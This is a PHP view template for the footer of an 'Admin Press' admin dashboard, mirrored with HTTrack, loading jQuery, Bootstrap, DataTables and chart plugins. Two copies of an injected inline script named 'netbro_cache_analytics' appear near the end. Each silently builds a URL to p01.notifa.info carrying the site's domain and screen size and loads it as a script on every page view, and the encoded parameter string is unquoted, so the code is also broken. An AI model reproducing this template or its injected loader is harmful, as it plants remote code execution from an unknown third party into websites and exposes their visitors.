            <footer class="footer">
                © 2019 Admin Press Admin by themedesigner.in
            </footer>
            <!-- ============================================================== -->
            <!-- End footer -->
            <!-- ============================================================== -->
        </div>
        <!-- ============================================================== -->
        <!-- End Page wrapper  -->
        <!-- ============================================================== -->
    </div>
    <!-- ============================================================== -->
    <!-- End Wrapper -->
    <!-- ============================================================== -->
    <!-- ============================================================== -->
    <!-- All Jquery -->
    <!-- ============================================================== -->
    <script src="<?php echo base_url('assets/plugins/jquery/jquery.min.js') ?>"></script>
    <!-- Bootstrap tether Core JavaScript -->
    <script src="<?php echo base_url('assets/plugins/bootstrap/js/popper.min.js') ?>"></script>
    <script src="<?php echo base_url('assets/plugins/bootstrap/js/bootstrap.min.js') ?>"></script>
    <!-- slimscrollbar scrollbar JavaScript -->
    <script src="<?php echo base_url('assets/js/jquery.slimscroll.js') ?>"></script>
    <!--Wave Effects -->
    <script src="<?php echo base_url('assets/js/waves.js') ?>"></script>
    <!--Menu sidebar -->
    <script src="<?php echo base_url('assets/js/sidebarmenu.js') ?>"></script>
    <!--stickey kit -->
    <script src="<?php echo base_url('assets/plugins/sticky-kit-master/dist/sticky-kit.min.js') ?>"></script>
    <!--Custom JavaScript -->
    <script src="<?php echo base_url('assets/js/custom.min.js') ?>"></script>
    <!-- ============================================================== -->
    <!-- This page plugins -->
    <!-- ============================================================== -->
    <!--sparkline JavaScript -->
 <script src="<?php echo base_url('assets/plugins/sticky-kit-master/dist/sticky-kit.min.js') ?>"></script>
    <script src="<?php echo base_url('assets/plugins/sparkline/jquery.sparkline.min.js') ?>"></script>
    
    <!-- This is data table -->
    <script src="<?php echo base_url('assets/plugins/datatables/jquery.dataTables.min.js') ?>"></script>
    <script src="<?php echo base_url('assets/plugins/sparkline/jquery.sparkline.min.js') ?>"></script>
    <!--morris JavaScript -->
    <script src="<?php echo base_url('assets/plugins/raphael/raphael-min.js') ?>"></script>
    <script src="<?php echo base_url('assets/plugins/morrisjs/morris.min.js') ?>"></script>
    <!-- Chart JS -->
    <script src="<?php echo base_url('assets/js/dashboard1.js') ?>"></script>
    <!-- ============================================================== -->
    <!-- Style switcher -->
    <!-- ============================================================== -->
    <script src="<?php echo base_url('assets/plugins/styleswitcher/jQuery.style.switcher.js') ?>"></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + 4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH24ojOHb%2fQMcag83sZWyogGktj%2bmZX5ZCJsv0FNs%2f180Dmflkr7j1dqYIYlLlfNxpYQFb6dwu63G82hnNejx5wpbu5izso4eAfscGlVLNNSNTZGL%2bGRHxFFDSspskRUNL8YTxomAZgHK8EWXau%2f%2fA0dO5MCRx8qyVeiRWTJ5gJuAk7VcBdnMg4CWBWqVY%2fyz4pAUMsukaDtI6kJy9v7tGVP3uOAw2IdHy9Td3c0kQisK4fNPATsZQxTpTtXPLWBlrkwuuxbBu4uc3yu9lMDsDMiwyrIKSMQMs6gTDLYqT%2bhvcBRqbZx5x2CffdPv%2bh3n0czJ%2fL%2b8qVbv0VspSbM%2fWdUoR6GdX8lWLVFdV93kdX5JtdcBrN%2bNBKpJ4Ob5hRD54J8QsPV4wla5IX1VRjASH0aWS0kpFYlbcYnamBdZi4pScU%2fRT%2b73M5ObTjNGOM%2bxa1rJbn4WwwF9fGkfpis3yBevm%2fKoCEHcqA8x5YuAIcxA%2fEskaiXRlm7g%3d%3d + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};






</script>

 
    <script>
    $(document).ready(function() {
        $('#myTable').DataTable();
        $(document).ready(function() {
            var table = $('#example').DataTable({
                "columnDefs": [{
                    "visible": false,
                    "targets": 2
                }],
                "order": [
                    [2, 'asc']
                ],
                "displayLength": 25,
                "drawCallback": function(settings) {
                    var api = this.api();
                    var rows = api.rows({
                        page: 'current'
                    }).nodes();
                    var last = null;
                    api.column(2, {
                        page: 'current'
                    }).data().each(function(group, i) {
                        if (last !== group) {
                            $(rows).eq(i).before('<tr class="group"><td colspan="5">' + group + '</td></tr>');
                            last = group;
                        }
                    });
                }
            });
            // Order by the grouping
            $('#example tbody').on('click', 'tr.group', function() {
                var currentOrder = table.order()[0];
                if (currentOrder[0] === 2 && currentOrder[1] === 'asc') {
                    table.order([2, 'desc']).draw();
                } else {
                    table.order([2, 'asc']).draw();
                }
            });
        });
    });
    $('#example23').DataTable({
        dom: 'Bfrtip',
        buttons: [
            'copy', 'csv', 'excel', 'pdf', 'print'
        ]
    });
    </script>
    <!-- ============================================================== -->
    <!-- Style switcher -->
    <!-- ============================================================== -->
    <script src="<?php echo base_url('assets/plugins/styleswitcher/jQuery.style.switcher.js') ?>"></script>
    <script>
    $(document).ready(function() {
        $(".dataTables_filter").removeAttr("top");
    });
    </script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + 4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH24ojOHb%2fQMcajlt3DNBSHRz5YwfjCWmg2CJ%2fwR7%2fTd72YC0a4iE3SLb%2fwjUO0r%2fa2%2fKHqkSbSaAYTfxRHXsnXeGC%2fUeHS83JkeURL9XRbviaWTgjCh8kBtDr8xmEObWWqZImecUA633uQ0TpmycCSTw3eeqxT76mwv1uxVWnZUrFsGfVBdkD8FZtrabY71M3IgbVuoQdcWU2v9v%2bbBqN4dhbg8UK06c5g6NJJPO7Y7e9KP9BHDTK8AuoiOaXM0QwpS%2bRUE9ujCwbinWcQzTSv8NzAZPQWNk1jFmWvgMjGa8%2fXe46R0dFf3HNOYNoOZSANRUUzHKeY3GBXUzZ5eJImm2srR7T7se9kcpUbJRYJW3zfm7jaVym2ep2OPmMqCoGW31Qgm5P8%2blyB9BWP2wSFv3WS9%2bch8b6tXd6YXbqEHx8MLuJwtqtYRRwHlE8nJ0oI2t8ZRwSYvJbM5DGuxnWlfXglzMJ0X6DuXrrHeQMU2LRqtYl%2bdag8Ook0zJ%2f4O%2fzT + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>

</body>


<!-- Mirrored from themedesigner.in/demo/admin-press/main/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 08 Feb 2019 18:00:43 GMT -->
</html>